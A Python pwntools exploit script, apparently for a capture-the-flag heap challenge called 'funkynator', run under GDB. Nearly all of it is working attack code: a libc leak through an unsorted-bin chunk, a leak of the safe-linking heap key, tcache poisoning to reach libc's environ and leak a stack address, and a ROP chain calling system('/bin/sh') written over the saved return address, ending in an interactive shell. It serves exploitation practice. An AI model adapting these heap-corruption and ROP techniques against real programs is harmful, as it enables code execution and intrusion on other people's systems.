#!/usr/bin/env python3
"""GDB-trace the crash."""
from pwn import *
import sys, time
from pathlib import Path

context.arch = 'amd64'
context.log_level = 'info'

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')
LD_PATH = str((CHALLENGE_DIR / 'glibc' / 'ld-linux-x86-64.so.2').resolve())
libc = ELF(str(CHALLENGE_DIR / 'glibc' / 'libc.so.6'), checksec=False)

LIBC_ENVIRON = 0x1eee28
LIBC_LEAK_OFF = 0x1e7b20
STACK_RIP_DELTA = 0x1b0
LIBC_BINSH = 0x1a7ea4
LIBC_SYSTEM = 0x053110

rop = ROP(libc, badchars=b'')
POP_RDI = rop.find_gadget(['pop rdi', 'ret']).address
RET_GAD = rop.find_gadget(['ret']).address

env = {'LD_LIBRARY_PATH': str(CHALLENGE_DIR.resolve() / 'glibc')}

# Start under GDB
r = gdb.debug([LD_PATH, BINARY], '''
set follow-fork-mode child
set detach-on-fork off
b *$rebase(0x1c5f)
b *$rebase(0x1a72)
b *$rebase(0x164b)
continue
''', env=env, cwd=str(CHALLENGE_DIR), gdbscript='', aslr=True)

r.recvuntil(b'name?')
r.sendline(b'pwn')

def menu(io, choice):
    io.recvuntil(b'> ')
    io.sendline(str(choice).encode())

def create_and_save(io, size, data=None):
    menu(io, 2)
    io.recvuntil(b':\n')
    io.sendline(str(size).encode())
    io.recvuntil(b':\n')
    d = data if data is not None else b'A' * size
    io.sendline(d[:size])
    io.recvuntil(b'text?\n')
    io.sendline(b'n')
    io.recvuntil(b'memory?\n')
    io.sendline(b'y')
    io.recvuntil(b'location ')
    return int(io.recvline().strip())

def delete(io, slot):
    menu(io, 4)
    io.recvuntil(b':\n')
    io.sendline(str(slot).encode())

def cont_proc(io, slot):
    menu(io, 5)
    io.recvuntil(b':\n')
    io.sendline(str(slot).encode())
    io.recvuntil(b'> ')

def ow(io, offset, value):
    io.sendline(b'3')
    io.recvuntil(b':\n')
    io.sendline(str(offset).encode())
    io.recvuntil(b'?\n')
    io.send(bytes([value & 0xff]) + b'\n')
    io.recvuntil(b'> ')

def wb(io, offset, data):
    for i, b in enumerate(data):
        ow(io, offset + i, b)

def examine(io):
    io.sendline(b'2')
    io.recvuntil(b'Your message:\n')
    data = io.recvuntil(b'+---------------------------+', drop=True)
    io.recvuntil(b'> ')
    return data.rstrip(b'\n')

def stop_free(io):
    io.sendline(b'1')
    io.recvuntil(b'memory?\n')
    io.sendline(b'n')

def stop_save(io):
    io.sendline(b'1')
    io.recvuntil(b'memory?\n')
    io.sendline(b'y')
    io.recvuntil(b'location ')
    return int(io.recvline().strip())

# Step 1
log.info('Step 1')
s1 = create_and_save(r, 0x100)
s2 = create_and_save(r, 0x500)
create_and_save(r, 0x20)
delete(r, s2)
cont_proc(r, s1)
ow(r, -8, 0x21)
ow(r, -7, 0x06)
for i in range(0x100, 0x110):
    ow(r, i, 0x41)
for i in range(0x118, 0x120):
    ow(r, i, 0x41)
data = examine(r)
libc_leak = u64(data[0x110:0x116].ljust(8, b'\x00'))
libc_base = libc_leak - LIBC_LEAK_OFF
log.success(f'libc_base = {hex(libc_base)}')

ow(r, -8, 0x11)
ow(r, -7, 0x01)
for i in range(0x100, 0x108):
    ow(r, i, 0)
ow(r, 0x108, 0x11)
ow(r, 0x109, 0x05)
for i in range(0x10A, 0x110):
    ow(r, i, 0)
wb(r, 0x110, p64(libc_leak))
wb(r, 0x118, p64(libc_leak))
stop_free(r)

environ_addr = libc_base + LIBC_ENVIRON
pop_rdi_addr = libc_base + POP_RDI
ret_addr = libc_base + RET_GAD

# Step 2
log.info('Step 2')
ka = create_and_save(r, 0x28)
kb = create_and_save(r, 0x28)
delete(r, kb)
cont_proc(r, ka)
ow(r, -8, 0x91)
for i in range(0x28, 0x40):
    ow(r, i, 0x42)
for i in range(0x48, 0x50):
    ow(r, i, 0x42)
data = examine(r)
heap_key = u64(data[0x40:0x48].ljust(8, b'\x00'))
log.success(f'heap_key = {hex(heap_key)}')
ow(r, -8, 0x41)
stop_save(r)

# Step 3
log.info('Step 3')
p = create_and_save(r, 0x28)
q = create_and_save(r, 0x28)
r_chk = create_and_save(r, 0x28)
delete(r, r_chk)
delete(r, q)
cont_proc(r, p)
ow(r, -8, 0x91)
target = environ_addr - 0x48
wb(r, 0x40, p64(target ^ heap_key))
ow(r, -8, 0x41)
stop_save(r)
create_and_save(r, 0x28, b'X' * 0x28)
s_t = create_and_save(r, 0x28, b'Y' * 0x28)
log.success(f'target slot = {s_t}')

# Step 4
log.info('Step 4')
cont_proc(r, s_t)
for i in range(0x28, 0x48):
    ow(r, i, 0x45)
data = examine(r)
stack_leak = u64(data[0x48:0x50].ljust(8, b'\x00'))
saved_rip = stack_leak - STACK_RIP_DELTA
log.success(f'stack_leak = {hex(stack_leak)}')

binsh_addr  = libc_base + LIBC_BINSH
system_addr = libc_base + LIBC_SYSTEM
chain = p64(ret_addr) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)

log.info(f'offset = {hex(saved_rip - target)}')
wb(r, saved_rip - target, chain)

# Trigger — GDB will catch at 0x1c5f/0x1a72/0x164b breakpoints
log.info('Triggering...')
r.sendline(b'1')
time.sleep(1)
try:
    r.sendline(b'id')
    resp = r.recv(timeout=2)
    log.success(f'Response: {resp}')
except:
    log.error('No shell')
r.interactive()
